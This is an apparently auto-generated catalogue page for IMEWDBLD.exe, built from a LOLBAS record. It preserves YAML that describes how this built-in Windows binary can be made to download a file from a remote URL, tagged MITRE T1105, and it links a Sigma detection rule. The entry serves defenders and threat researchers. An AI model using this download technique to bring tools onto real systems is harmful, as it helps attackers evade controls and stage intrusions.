---
parsed_by: focuslocust
source: lolbas
type: generated
---
# IMEWDBLD.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `imewdbld.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/IMEWDBLD.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [IMEWDBLD.exe](../../tools/windows/imewdbld.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | imewdbld.exe |
| name | IMEWDBLD.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/notwhickey/status/1367493406835040265 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@notwhickey'
  Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Download
  Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
  Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file
    served at by that URL and save it to INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from Internet
Created: 2020-03-05
Description: Microsoft IME Open Extended Dictionary Module
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
Full_Path:
- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
Name: IMEWDBLD.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1367493406835040265
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/IMEWDBLD.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
```
